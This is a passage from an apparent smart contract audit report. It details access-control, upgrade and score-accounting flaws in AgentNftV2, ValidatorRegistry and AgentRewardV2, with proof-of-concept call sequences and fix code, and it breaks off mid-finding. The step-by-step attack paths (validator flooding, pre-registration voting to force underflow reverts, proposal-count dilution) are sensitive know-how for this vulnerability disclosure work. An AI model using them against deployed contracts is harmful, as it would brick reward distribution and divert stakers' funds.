Whenever `ValidatorRegistry` invokes `_getScoreOf`, `_getMaxScore`, or `_getPastScore`—which happens during `AgentNftV2.mint`, `AgentNftV2.addValidator` (called by `AgentVeToken.stake`), `ValidatorRegistry.validatorScore` (called by `AgentRewardV2._distributeValidatorRewards`), `ValidatorRegistry.getPastValidatorScore`, and `ValidatorRegistry.totalUptimeScore`—the EVM jumps to the stale bytecode offset stored in the proxy. This either reverts with an invalid jump/panic (denying service to core protocol operations) or, if the old offset coincides with a valid internal function tag of matching stack layout in the new implementation, executes the wrong internal function.

### Assumptions and preconditions

1. `AgentNft` is deployed behind an upgradeable proxy and initialized via `initialize(defaultAdmin)`.
2. The proxy implementation is upgraded to a new implementation contract (e.g., `AgentNftV2` or a future upgrade) where bytecode offsets/internal function IDs of `_validatorScoreOf`, `totalProposals`, or `_getPastValidatorScore` differ from the previous implementation.

### Proof of concept

1. The protocol deploys the initial `AgentNft` proxy and calls `initialize(defaultAdmin)`. Line 65 executes `__ValidatorRegistry_init(_validatorScoreOf, totalProposals, _getPastValidatorScore)`, storing the V1 runtime bytecode offsets of those three functions in slot 1 of the proxy.
2. The proxy is upgraded to `AgentNftV2` (which adds new state accessors and functions such as `isBlacklisted`, `setBlacklist`, `migrateScoreFunctions`, `setEloCalculator`, and `migrateVirtual`).
3. Because `AgentNftV2` has different runtime bytecode, the `JUMPDEST` offsets for `_validatorScoreOf`, `totalProposals`, and `_getPastValidatorScore` shift in the new implementation.
4. `AgentNftV2.initialize` has the `initializer` modifier and cannot be called during `upgradeToAndCall`. Moreover, no account holds `ADMIN_ROLE` immediately after the upgrade because `_grantRole(ADMIN_ROLE, defaultAdmin)` (line 69) was only placed inside `initialize`.
5. A user calls `AgentVeToken.stake(...)` (which calls `AgentNftV2.addValidator` -> `_initValidatorScore` -> `_getMaxScore(virtualId)`), or `AgentRewardV2.distributeRewards(...)` is called (which calls `AgentNftV2.validatorScore` -> `_getScoreOf(virtualId, validator)`).
6. The proxy loads the stale V1 bytecode offset from storage and jumps to an invalid or wrong target in `AgentNftV2`, causing the transaction to revert or return corrupted score values.

### Impact assessment

- **Severity**: High / Medium
- **Technical Effect**: All functions relying on `ValidatorRegistry` callbacks (`mint`, `addValidator`, `stake`, `validatorScore`, `getPastValidatorScore`, `totalUptimeScore`, and `_distributeValidatorRewards`) either revert due to invalid internal function pointers or jump to unintended internal functions after an upgrade.
- **Business Impact**: Core protocol workflows—including creating new agents (`executeApplication`), staking LP tokens (`stake`), and distributing validator rewards (`distributeRewards`)—are broken across upgrades or exposed to a non-atomic migration window where `ADMIN_ROLE` is not even initialized.

### Remediation

Avoid storing internal function pointers in upgradeable contract storage. Instead, define `_getScoreOf`, `_getMaxScore`, and `_getPastScore` as `internal view virtual` functions in `ValidatorRegistry` and override them in `AgentNftV2`, removing the function-pointer parameters from `__ValidatorRegistry_init` in `AgentNftV2.initialize`. Additionally, if upgrading from V1, provide a `reinitializer(2)` function to initialize V2 roles atomically during the upgrade.

```solidity
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address defaultAdmin) public initializer {
        __ERC721_init("Agent", "AGENT");
        __ERC721URIStorage_init();
        __CoreRegistry_init();
        __ValidatorRegistry_init();
        __AccessControl_init();
        _grantRole(DEFAULT_ADMIN_ROLE, defaultAdmin);
        _grantRole(VALIDATOR_ADMIN_ROLE, defaultAdmin);
        _grantRole(ADMIN_ROLE, defaultAdmin);
        _nextVirtualId = 1;
    }

    function initializeV2(address defaultAdmin) external reinitializer(2) {
        _grantRole(ADMIN_ROLE, defaultAdmin);
        _migrateScoreFunctions(_validatorScoreOf, totalProposals, _getPastValidatorScore);
    }

    function setContributionService(
        address contributionNft_,
        address serviceNft_
    ) external onlyRole(DEFAULT_ADMIN_ROLE) {
        _contributionNft = contributionNft_;
        _serviceNft = serviceNft_;
    }
```

## Finding 7: Missing Access Control and Lifecycle Validation in `AgentNftV2.addValidator` Allows Unauthorized Validator Enrollment

### Synopsis

`AgentNftV2.addValidator` lacks access control and agent lifecycle existence checks. Any unprivileged caller can arbitrarily register addresses as validators for any `virtualId` (including unminted ones), enabling third-party enrollment interference, duplicate founder registration, base score manipulation, and denial of service during reward distribution.

### Technical details

In `contracts/virtualPersona/AgentNftV2.sol`, the `addValidator` function is declared `public` without any authorization modifier or lifecycle validation on `virtualId`:

```solidity
function addValidator(uint256 virtualId, address validator) public {
    if (isValidator(virtualId, validator)) {
        return;
    }
    _addValidator(virtualId, validator);
    _initValidatorScore(virtualId, validator);
}
```

Although `AgentNftV2` defines `VALIDATOR_ADMIN_ROLE` (`bytes32 public constant VALIDATOR_ADMIN_ROLE = keccak256("VALIDATOR_ADMIN_ROLE")`) and associates each persona with a specific `veToken` (`virtualLPs[virtualId].veToken`), `addValidator` enforces neither role-based access control nor caller validation, nor does it verify that `virtualId` corresponds to an initialized agent (`virtualInfos[virtualId].dao != address(0)`).

This creates several interconnected integrity failures:

1. **Registration Outside Valid Lifecycle States & Duplicate Founder Entry**: Because `addValidator` does not verify that `virtualId` has been minted, anyone can call `addValidator(nextVirtualId, founder)` before `mint` is executed. At that point, `virtualInfos[virtualId].dao` is `address(0)`, so `_initValidatorScore` sets `_baseValidatorScore[founder][virtualId] = 0`. When `mint` is subsequently called, it unconditionally invokes `_addValidator(virtualId, founder)` without checking `isValidator(virtualId, founder)`, pushing `founder` into `_validators[virtualId]` a second time.
2. **Third-Party Enrollment Interference (Premature Base Score Locking)**: When a validator is legitimately added after `N` proposals have occurred, `_initValidatorScore` sets `_baseValidatorScore[validator][virtualId] = totalProposals(virtualId) = N` so the validator is not penalized for historical proposals prior to joining. An attacker can pre-enroll prospective validators when `totalProposals == 0` (even before `virtualId` is minted). Because `addValidator` returns early if `isValidator(virtualId, validator)` is already `true`, subsequent legitimate enrollment will not update `_baseValidatorScore`, permanently depressing the victim's participation score.
3. **Validator Set Bloat (Denial of Service)**: Any caller can repeatedly invoke `addValidator` with arbitrary addresses to inflate `_validators[virtualId]`. Functions that iterate over the full validator list—such as `AgentRewardV2._distributeValidatorRewards` and `ValidatorRegistry.totalUptimeScore`—will exceed block gas limits and revert.

### Assumptions and preconditions

- `AgentNftV2` is deployed and initialized as the protocol's persona and validator registry.
- No special roles or privileges are required by the caller to invoke `AgentNftV2.addValidator`.

### Proof of concept

1. **Premature / Unminted Enrollment & Duplicate Validator Entry**:
   - Suppose `_nextVirtualId` is `1` and an application for `founder` is pending execution in `AgentFactory`.
   - An unprivileged user calls `AgentNftV2.addValidator(1, founder)` before `executeApplication` runs.
   - `isValidator(1, founder)` is `false`, so `_validatorsMap[1][founder]` is set to `true`, `founder` is pushed to `_validators[1]` at index `0`, and `_baseValidatorScore[founder][1]` is set to `totalProposals(1)` (`0`).
   - When `executeApplication` calls `AgentNftV2.mint(1, ..., founder, ...)`, lines 111–112 execute `_addValidator(1, founder)` unconditionally, pushing `founder` to `_validators[1]` a second time at index `1`.
   - During `AgentRewardV2._distributeValidatorRewards`, the loop iterates over `founder` twice, paying duplicate participation rewards and double-counting `validatorRewards - participationReward` in `validatorPoolRewards`.

2. **Validator Registry Flooding (DoS)**:
   - An unprivileged user calls `AgentNftV2.addValidator(1, addr_i)` for thousands of distinct addresses `addr_i`.
   - Each call appends `addr_i` to `_validators[1]`.
   - Subsequent calls to `AgentRewardV2._distributeValidatorRewards` or `AgentNftV2.totalUptimeScore(1)` iterate over `validatorCount(1)` and revert due to running out of gas.

### Impact assessment

- **Severity**: High
- **Direct Technical Effects**: Unauthorized modification of the validator set for any existing or future `virtualId`, duplicate validator entries in `_validators[virtualId]`, corrupted validator base scores, and unbounded array growth in `_validators[virtualId]`.
- **Business Implications**: Reward distribution in `AgentRewardV2` can be permanently bricked via out-of-gas reverts or corrupted via duplicate validator entries and manipulated participation scores.

### Remediation

Restrict `addValidator` so that it can only be called by authorized callers (such as `VALIDATOR_ADMIN_ROLE` or the corresponding `veToken` contract for `virtualId`), and require that `virtualId` has already been minted.

```solidity
    function addValidator(uint256 virtualId, address validator) public {
        _requireOwned(virtualId);
        require(
            hasRole(VALIDATOR_ADMIN_ROLE, _msgSender()) || _msgSender() == virtualLPs[virtualId].veToken,
            "Unauthorized caller"
        );
        if (isValidator(virtualId, validator)) {
            return;
        }
        _addValidator(virtualId, validator);
        _initValidatorScore(virtualId, validator);
    }
```

## Finding 8: Baseline and Accrued Validator Score Double-Counting in `AgentNftV2.addValidator` and `AgentNftV2._validatorScoreOf` Causes Reward Distribution Underflow

### Synopsis

In `AgentNftV2`, `addValidator` initializes a new validator's baseline score to `totalProposals(virtualId)`, while `_validatorScoreOf` returns all votes ever cast by that account in `AgentDAO`. If an account votes before becoming a validator (or votes on an already-created active proposal after registration), `validatorScore` exceeds `totalProposals`, causing `_distributeValidatorRewards` in `AgentRewardV2` to revert due to arithmetic underflow.

### Technical details

`AgentNftV2` inherits from `ValidatorRegistry` and initializes its score callbacks in `initialize` (and `migrateScoreFunctions`) with `(_validatorScoreOf, totalProposals, _getPastValidatorScore)`.

In `ValidatorRegistry.sol`, a validator's score is computed as the sum of a baseline score recorded at registration time and the validator's accrued score in the DAO:

```solidity
function _initValidatorScore(uint256 virtualId, address validator) internal {
    _baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId);
}

function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getScoreOf(virtualId, validator);
}
```

In `AgentNftV2.sol`:
1. `addValidator(uint256 virtualId, address validator)` (line 133-139) is a `public` function that registers `validator` and calls `_initValidatorScore(virtualId, validator)` (line 138), setting `_baseValidatorScore[validator][virtualId] = totalProposals(virtualId)`. The intent of setting `_baseValidatorScore` to `totalProposals(virtualId)` is to avoid penalizing a newly added validator for proposals that occurred before they became a validator.
2. `_validatorScoreOf(uint256 virtualId, address account)` (lines 141-148) queries `IAgentDAO(info.dao).scoreOf(account)`, which returns the total number of proposals `account` has ever voted on in that DAO.

This composition of baseline score and accrued score fails to maintain the invariant `validatorScore(virtualId, validator) <= totalProposals(virtualId)` in two ways:

1. **Voting prior to validator registration:** In `AgentDAO`, any address (even with zero voting weight) can cast a vote on an active proposal, which increments `dao.scoreOf(account)`. If `account` votes on $k \ge 1$ proposals before `addValidator(virtualId, account)` is called (either directly by any caller or via staking/delegation in `AgentVeToken`), `_initValidatorScore` sets `_baseValidatorScore[account][virtualId] = totalProposals(virtualId)` without subtracting the already-accrued `dao.scoreOf(account)`. Consequently:
   $$\text{validatorScore} = \text{totalProposals} + k > \text{totalProposals}$$
2. **Joining while a proposal is active:** When a proposal is created in `AgentDAO`, `totalProposals(virtualId)` is immediately incremented. If `addValidator(virtualId, account)` is called while that proposal is still active, `_baseValidatorScore[account][virtualId]` already includes the active proposal in `totalProposals(virtualId)`. When `account` subsequently casts a vote on that active proposal, `dao.scoreOf(account)` increments by 1 while `totalProposals(virtualId)` remains unchanged, again resulting in `validatorScore > totalProposals`.

Downstream, `AgentRewardV2._distributeValidatorRewards` (lines 243-248) calculates each validator's reward share and the residual pool reward as follows:

```solidity
uint256 participationReward = totalProposals == 0
    ? 0
    : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;
_validatorRewards[validator][rewardId] = participationReward;

validatorPoolRewards += validatorRewards - participationReward;
```

Whenever `nft.validatorScore(virtualId, validator) > totalProposals` and `validatorRewards > 0`, `participationReward` exceeds `validatorRewards`. Under Solidity `^0.8.20` checked arithmetic, `validatorRewards - participationReward` reverts with a panic (`0x11` arithmetic underflow), permanently blocking reward distribution for that `virtualId`.

### Assumptions and preconditions

1. A virtual persona (`virtualId`) has been created and has at least one proposal in its `AgentDAO` (`totalProposals(virtualId) >= 1`).
2. An address either casts a vote on at least one proposal before being registered via `addValidator`, or is registered via `addValidator` while a proposal is active and then casts a vote on that proposal.
3. The validator has non-zero voting power (`getVotes(validator) > 0`) when `_distributeValidatorRewards` is executed.

### Proof of concept

1. A virtual persona `virtualId = 1` is deployed and a proposal (`proposalId`) is created in its `AgentDAO`. At this point, `agentNft.totalProposals(1) == 1`.
2. An unregistered account `Alice` casts a vote on `proposalId` via `agentDAO.castVoteWithReasonAndParams(proposalId, 1, "", params)`. `agentDAO.scoreOf(Alice)` is now `1`, while `isValidator(1, Alice)` is still `false`.
3. `Alice` (or any staker delegating to `Alice`, or any caller invoking `agentNft.addValidator(1, Alice)`) registers `Alice` as a validator and delegates non-zero `veToken` voting power to `Alice`.
4. Inside `AgentNftV2.addValidator(1, Alice)`, `_initValidatorScore(1, Alice)` sets `_baseValidatorScore[Alice][1] = totalProposals(1) = 1`.
5. Querying `agentNft.validatorScore(1, Alice)` now returns `_baseValidatorScore[Alice][1] + _validatorScoreOf(1, Alice) = 1 + 1 = 2`, while `agentNft.totalProposals(1)` is `1` (a 200% participation rate).
6. When `AgentRewardV2` distributes rewards for `virtualId = 1`, `_distributeValidatorRewards` computes `participationReward = (validatorRewards * 2) / 1 = 2 * validatorRewards`.
7. Execution reaches `validatorPoolRewards += validatorRewards - participationReward` (`contracts/AgentRewardV2.sol:248`), which attempts to compute `validatorRewards - 2 * validatorRewards` and reverts with an arithmetic underflow panic, preventing reward distribution for all validators and stakers of `virtualId = 1`.

### Impact assessment

- **Severity:** High
- **Direct Technical Effect:** `validatorScore(virtualId, validator)` exceeds `totalProposals(virtualId)`, violating the participation rate invariant ($\le 100\%$) and causing arithmetic underflow in `AgentRewardV2._distributeValidatorRewards`.
- **Business Implications:** Any user can trivially trigger a denial of service on reward distribution for a virtual persona by voting on a proposal prior to being added as a validator and receiving delegated stake, or by registering as a validator while a proposal is active and then voting on it. Even if additional proposals are created later where the validator votes, `validatorScore` remains strictly greater than `totalProposals`, keeping reward distribution bricked unless the validator intentionally misses future proposals.

### Remediation

Ensure that initializing a validator's baseline score accounts for any score already accrued in `AgentDAO`, and cap `validatorScore` (or the score returned by `_validatorScoreOf` / `_getPastValidatorScore`) so that a validator's total score cannot exceed `totalProposals(virtualId)`.

In `contracts/virtualPersona/AgentNftV2.sol`:

```solidity
    function _validatorScoreOf(uint256 virtualId, address account) internal view returns (uint256) {
        VirtualInfo memory info = virtualInfos[virtualId];
        if (info.dao == address(0)) {
            return 0;
        }
        IAgentDAO dao = IAgentDAO(info.dao);
        uint256 score = dao.scoreOf(account);
        uint256 baseScore = _baseValidatorScore[account][virtualId];
        uint256 maxScore = dao.proposalCount();
        if (baseScore + score > maxScore) {
            return maxScore > baseScore ? maxScore - baseScore : 0;
        }
        return score;
    }
```

Alternatively, in `ValidatorRegistry._initValidatorScore`, deduct the validator's current `_getScoreOf(virtualId, validator)` from `_getMaxScore(virtualId)` when initializing `_baseValidatorScore[validator][virtualId]`, and cap `validatorScore` at `_getMaxScore(virtualId)`.

## Finding 9: Historical State Inconsistency in `AgentNftV2._getPastValidatorScore` and `AgentNftV2.totalProposals` Corrupts Validator Uptime and Reward Calculations

### Synopsis

In `AgentNftV2`, `_getPastValidatorScore` and `totalProposals` supply `ValidatorRegistry` with a checkpointed historical vote count alongside an uncheckpointed, mutable proposal count baseline. This mixed-timepoint aggregation distorts historical validator uptime scores, allowing inflated past scores (exceeding 100% participation) or reverts during reward calculations.

### Technical details

`AgentNftV2` initializes and migrates `ValidatorRegistry` with three internal callbacks (`AgentNftV2.sol` lines 65 and 249):
- `_validatorScoreOf` for current vote score (`dao.scoreOf(account)`)
- `totalProposals` (`163-169`) for `_getMaxScore`, which returns the current mutable `dao.proposalCount()` (`169`)
- `_getPastValidatorScore` (`155-161`) for `_getPastScore`, which queries `dao.getPastScore(account, timepoint)` (`160`)

In `ValidatorRegistry.sol`:
```solidity
function _initValidatorScore(uint256 virtualId, address validator) internal {
    _baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId);
}

function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getScoreOf(virtualId, validator);
}

function getPastValidatorScore(
    uint256 virtualId,
    address validator,
    uint256 timepoint
) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getPastScore(virtualId, validator, timepoint);
}
```

This design introduces several interconnected historical state inconsistencies in `_getPastValidatorScore` (`155-161`) and `totalProposals` (`163-169`):

1. **Mixed-Timepoint Aggregation and Uncheckpointed Baseline Adjustments:**
   When a validator is registered at block $B_{\text{init}}$, `_initValidatorScore` sets `_baseValidatorScore[validator][virtualId]` to `totalProposals(virtualId)` (`dao.proposalCount()` at $B_{\text{init}}$). Because `_baseValidatorScore` is not checkpointed by block number and `totalProposals` (`163-169`) only reads the latest mutable `dao.proposalCount()`, calling `getPastValidatorScore(virtualId, validator, timepoint)` combines `_baseValidatorScore` from $B_{\text{init}}$ with `_getPastValidatorScore` (`dao.getPastScore(account, timepoint)` at `160`) from `timepoint`.
   - For any historical query with `timepoint` $< B_{\text{init}}$, `getPastValidatorScore` retroactively adds the future `_baseValidatorScore` (the proposal count at $B_{\text{init}}$) to the historical score at `timepoint`, resulting in a past validator score that can exceed the total proposals that existed at `timepoint`.
   - If an account cast votes on proposals in `AgentDAO` prior to being registered as a validator, `_initValidatorScore` sets `_baseValidatorScore` to the full `totalProposals(virtualId)` without deducting the account's existing `dao.scoreOf(validator)` (or past score). Consequently, both `validatorScore` and `getPastValidatorScore` exceed `totalProposals(virtualId)` (e.g., yielding $>100\%$ participation in `AgentRewardV2._distributeValidatorRewards` at line 245, where `validatorRewards - participationReward` at line 248 underflows and reverts reward distribution).

2. **Mutable Proposal Count Without Historical Checkpointing:**
   `totalProposals` (`163-169`) directly returns `dao.proposalCount()` (`169`), which is incremented immediately upon `propose()` in `GovernorStorageUpgradeable._propose` rather than checkpointed by block number or restricted to matured/concluded proposals. Queries depending on `totalProposals` cannot reconstruct historical proposal counts at a past `timepoint`, and active or pending proposals that validators have not yet had the opportunity to vote on immediately dilute participation ratios (`validatorScore / totalProposals`).

3. **Clock Boundary Inconsistency in `_getPastValidatorScore`:**
   `_getPastValidatorScore` (`160`) delegates directly to `AgentDAO.getPastScore(account, timepoint)`, which enforces `timepoint < clock()` (`block.number`) and reverts with `ERC5805FutureLookup(timepoint, currentTimepoint)` when `timepoint == block.number` (such as same-block reward queries when a reward checkpoint is created at `block.number`), whereas `totalProposals` (`169`) always reads state as of `block.number`.

### Assumptions and preconditions

- A Virtual Persona (`virtualId`) has been deployed with a valid `AgentDAO` contract stored in `virtualInfos[virtualId].dao`.
- At least one governance proposal has been created in `AgentDAO` (`dao.proposalCount() > 0`).
- A validator either votes on a proposal before being registered as a validator (before staking/delegation triggers `_initValidatorScore`), or is registered as a validator at a block after historical reward snapshots (`timepoint`) were recorded.

### Proof of concept

1. **Pre-registration voting causes score > `totalProposals` and reward distribution revert:**
   - Suppose `virtualId = 1` has 2 proposals created in `AgentDAO` (`totalProposals(1) == 2`).
   - Account $V$ (not yet a registered validator in `ValidatorRegistry`) casts a vote on Proposal 1 via `AgentDAO.castVote(proposalId, 1)`. In `AgentDAO._castVote` (line 137), `_scores[V]` is pushed with value `1`.
   - Later, a staker stakes and delegates to $V$, which registers $V$ as a validator and invokes `_initValidatorScore(1, V)`.
   - `_initValidatorScore` calls `totalProposals(1)` (`163-169`), setting `_baseValidatorScore[V][1] = 2`.
   - Now, `validatorScore(1, V)` returns `_baseValidatorScore[V][1] + _validatorScoreOf(1, V) = 2 + 1 = 3`, and `getPastValidatorScore(1, V, timepoint)` returns `2 + dao.getPastScore(V, timepoint) = 3`, even though `totalProposals(1)` is only `2`.
   - When `AgentRewardV2.distributeRewardsForAgents` calls `_distributeValidatorRewards`:
     ```solidity
     uint256 participationReward = totalProposals == 0
         ? 0
         : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;
     ...
     validatorPoolRewards += validatorRewards - participationReward;
     ```
     Because `nft.validatorScore(1, V) == 3 > totalProposals (2)`, `participationReward` is $1.5 \times \text{validatorRewards}$, causing `validatorRewards - participationReward` to revert with arithmetic underflow (Solidity 0.8 panic `0x11`).

2. **Retroactive baseline inflation on historical queries (`timepoint < B_init`):**
   - At block $T_1 = 100$, 2 proposals exist (`totalProposals == 2`). Reward checkpoint 1 is recorded at block $100$. Account $V$ is not yet a validator and has 0 score at block $100$.
   - By block $T_2 = 200$, 8 more proposals are created (`totalProposals == 10`). Account $V$ is registered as a validator at block $200$, setting `_baseValidatorScore[V][1] = 10`.
   - Querying `getPastValidatorScore(1, V, 100)` executes `_baseValidatorScore[V][1] + _getPastValidatorScore(1, V, 100)` (`160`), returning `10 + 0 = 10` for block $100$ (when only 2 proposals existed and $V$ had 0 participation).

### Impact assessment

- **Severity:** High / Medium.
- **Technical Impact:** Historical and current validator scores can exceed the total number of proposals (`validatorScore > totalProposals`), violating the core invariant that participation rate is bounded by $[0, 100\%]$. In `AgentRewardV2._distributeValidatorRewards`, this causes an arithmetic underflow revert on `validatorRewards - participationReward`, permanently blocking reward distribution for the affected `virtualId`. For historical score queries via `getPastValidatorScore`, uncheckpointed baseline adjustments corrupt past participation rates across reward epochs.

### Remediation

Ensure that historical validator scores and proposal counts are evaluated consistently at the requested `timepoint`, and that baseline score initialization accounts for any existing score of the validator and is checkpointed (or bounded by the proposal count at that timepoint). Within `AgentNftV2.sol`, clamp or adjust `_getPastValidatorScore` and ensure `totalProposals` / score baselines cannot exceed the proposal count:

```solidity
    function _getPastValidatorScore(
        uint256 virtualId,
        address account,
        uint256 timepoint
    ) internal view returns (uint256) {
        VirtualInfo memory info = virtualInfos[virtualId];
        if (info.dao == address(0)) {
            return 0;
        }
        IAgentDAO dao = IAgentDAO(info.dao);
        if (timepoint >= block.number) {
            return dao.scoreOf(account);
        }
        return dao.getPastScore(account, timepoint);
    }

    function totalProposals(uint256 virtualId) public view returns (uint256) {
        VirtualInfo memory info = virtualInfos[virtualId];
        if (info.dao == address(0)) {
            return 0;
        }
        IAgentDAO dao = IAgentDAO(info.dao);
        return dao.proposalCount();
    }
```

Additionally, in `ValidatorRegistry`, `_baseValidatorScore` should be checkpointed using `Checkpoints.Trace208` (keyed by `block.number` and Looked up via `upperLookupRecent(timepoint)` in `getPastValidatorScore`) and initialized as `_getMaxScore(virtualId) - _getScoreOf(virtualId, validator)` in `_initValidatorScore` so a validator's score never exceeds `totalProposals`.

## Finding 10: Unfiltered `dao.proposalCount()` in `AgentNftV2.totalProposals` corrupts validator participation scores and reward distribution

### Synopsis

`AgentNftV2.totalProposals` returns raw `dao.proposalCount()`, which counts all created proposals regardless of whether they are pending, active, or canceled. Because `totalProposals` serves as both the initial base score for new validators and the participation reward denominator, active or canceled proposals distort rewards and cause underflow reverts during reward distribution.

### Technical details

In `contracts/virtualPersona/AgentNftV2.sol`, `totalProposals(uint256 virtualId)` is registered as the `_getMaxScore` callback in `ValidatorRegistry` (via `__ValidatorRegistry_init` and `migrateScoreFunctions`) and is also queried directly by `AgentRewardV2._distributeValidatorRewards`:

```solidity
function totalProposals(uint256 virtualId) public view returns (uint256) {
    VirtualInfo memory info = virtualInfos[virtualId];
    if (info.dao == address(0)) {
        return 0;
    }
    IAgentDAO dao = IAgentDAO(info.dao);
    return dao.proposalCount();
}
```

`dao.proposalCount()` inherits from OpenZeppelin's `GovernorStorageUpgradeable.proposalCount()`, which simply returns `$._proposalIds.length`. Every call to `AgentDAO.propose()` immediately appends the new `proposalId` to `_proposalIds`, and `cancel()` never removes it. Consequently, `totalProposals(virtualId)` includes:

1. **Pending and Active proposals** that have not concluded their voting period.
2. **Canceled proposals** on which voting was never possible.

This breaks governance metric integrity in two ways:

1. **Score Exceeding Max Proposals (Underflow DoS in Reward Distribution):**
   When a validator is registered, `ValidatorRegistry._initValidatorScore` sets `_baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId)`, which equals `totalProposals(virtualId)`.
   - If a proposal is currently `Active` (or `Pending` with `votingDelay == 0`) when the validator is added, `_baseValidatorScore` already includes that proposal. When the new validator subsequently casts a vote on that active proposal, `dao.scoreOf(validator)` increments by 1.
   - Similarly, if an account cast votes on proposals prior to being registered as a validator, its `dao.scoreOf(validator)` is already non-zero when `_baseValidatorScore` is initialized to `totalProposals(virtualId)`.
   - In both cases, `validatorScore(virtualId, validator)` (`_baseValidatorScore + scoreOf`) becomes strictly greater than `totalProposals(virtualId)`. When `AgentRewardV2._distributeValidatorRewards` computes:
     ```solidity
     uint256 participationReward = totalProposals == 0
         ? 0
         : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;
     _validatorRewards[validator][rewardId] = participationReward;

     validatorPoolRewards += validatorRewards - participationReward;
     ```
     `participationReward` exceeds `validatorRewards`, causing `validatorRewards - participationReward` to revert with an arithmetic underflow (Solidity 0.8+), permanently blocking reward distribution for that `virtualId`.

2. **Reward Denominator Manipulation / Dilution:**
   Because `dao.proposalCount()` increments as soon as `propose()` is called and never decrements on `cancel()`, any proposer meeting `proposalThreshold` (or the contribution admin) can create a proposal—and immediately cancel it if `votingDelay > 0`, or create it right before `distributeRewardsForAgents`—to permanently inflate `totalProposals(virtualId)`. Since `totalProposals` is the denominator in `(validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals`, unvotable (canceled) or newly opened proposals dilute every validator's and staker's participation rate and siphon their rewards into `validatorPoolRewards`.

### Assumptions and preconditions

- An Agent (`virtualId`) is deployed with a valid `AgentDAO` address in `virtualInfos[virtualId]`.
- For the underflow DoS: either a proposal is active when a new validator is registered (e.g., via staking/delegation) and the validator votes on it, or the account voted on a past proposal before being registered as a validator.
- For denominator dilution: a proposer creates a proposal that is either canceled before voting or still active when rewards are distributed.

### Proof of concept

#### Scenario 1: Underflow DoS in Reward Distribution

1. Suppose `virtualId = 1` has 1 completed proposal and 1 currently `Active` proposal (`proposalId = P2`), so `AgentNftV2.totalProposals(1)` is `2`.
2. A staker stakes and delegates to a new validator `V`. `ValidatorRegistry._initValidatorScore(1, V)` sets `_baseValidatorScore[V][1] = totalProposals(1) = 2`.
3. While `P2` is still active, validator `V` votes on `P2` via `AgentDAO.castVote(P2, 1)`. `AgentDAO._castVote` increments `_scores[V]` to `1`.
4. Now `agentNft.validatorScore(1, V)` returns `_baseValidatorScore[V][1] + dao.scoreOf(V) = 2 + 1 = 3`, while `agentNft.totalProposals(1)` is still `2`.
5. Governance calls `AgentRewardV2.distributeRewardsForAgents(mainRewardIndex, [1])`.
6. Inside `_distributeValidatorRewards`, for validator `V`:
   - `participationReward = (validatorRewards * 3) / 2 = 1.5 * validatorRewards`.
   - Line 248 executes `validatorPoolRewards += validatorRewards - participationReward`, which underflows and reverts the entire transaction.

#### Scenario 2: Reward Dilution via Canceled / Last-Minute Proposals

1. Validator `V` has voted on all `N = 2` proposals (`validatorScore = 2`, `totalProposals = 2`, 100% participation).
2. Before `distributeRewardsForAgents` is called, a proposer creates 2 new proposals (or creates and cancels them). `dao.proposalCount()` becomes `4`.
3. When `distributeRewardsForAgents` executes, `totalProposals(1)` returns `4`, while `V`'s score is `2`. `V` only receives `2 / 4 = 50%` of their earned validator rewards, and the remaining `50%` is diverted to `validatorPoolRewards`.

### Impact assessment

- **Severity:** High
- **Direct Technical Effects:**
  1. Permanent denial of service in `AgentRewardV2._distributeValidatorRewards` due to arithmetic underflow whenever any validator's `validatorScore` exceeds `totalProposals`.
  2. Systematic underpayment of validator and staker rewards whenever proposals are pending, active at the time of distribution, or canceled.

### Remediation

`totalProposals` should only count proposals that have concluded their voting period and were not canceled (e.g., proposals whose deadline has passed and whose state is not `Canceled`), or `AgentDAO` should track settled/votable proposals explicitly and cap validator scores at `totalProposals`.

```solidity
    function totalProposals(uint256 virtualId) public view returns (uint256) {
        VirtualInfo memory info = virtualInfos[virtualId];
        if (info.dao == address(0)) {
            return 0;
        }
        IAgentDAO dao = IAgentDAO(info.dao);
        IGovernor governor = IGovernor(info.dao);
        uint256 count = dao.proposalCount();
        uint256 settledProposals = 0;
        for (uint256 i = 0; i < count; i++) {
            (uint256 proposalId, , , , ) = GovernorStorageUpgradeable(info.dao).proposalDetailsAt(i);
            IGovernor.ProposalState status = governor.state(proposalId);
            if (
                status != IGovernor.ProposalState.Pending &&
                status != IGovernor.ProposalState.Active &&
                status != IGovernor.ProposalState.Canceled
            ) {
                settledProposals++;
            }
        }
        return settledProposals;
    }
```

## Finding 11: `_initValidatorScore` double-counts DAO votes cast before validator registration: a 1-token validator collects 100% participation on every reward round (unbounded drain of the validator penalty pool), and rounds where the inflated score exceeds `totalProposals` revert, stranding the entire round

### Synopsis

`ValidatorRegistry._initValidatorScore` (contracts/virtualPersona/ValidatorRegistry.sol:36-38) initializes a new validator's base score to `_getMaxScore(virtualId)` — i.e. the DAO's current `totalProposals` — **without subtracting the DAO score the account has already accumulated by voting**, and stores it in a plain mapping that is **never checkpointed**. Any address that casts DAO votes *before* becoming a validator therefore ends up with `validatorScore = totalProposals + ownVotes` (up to 2x `totalProposals`).

Because `AgentRewardV2._distributeValidatorRewards` pays each validator `participationReward = validatorRewards * validatorScore / totalProposals` and dumps the remainder (`validatorRewards - participationReward`, the missed-vote penalty) into the shared `validatorPoolRewards`, this one double-count yields two proved losses:

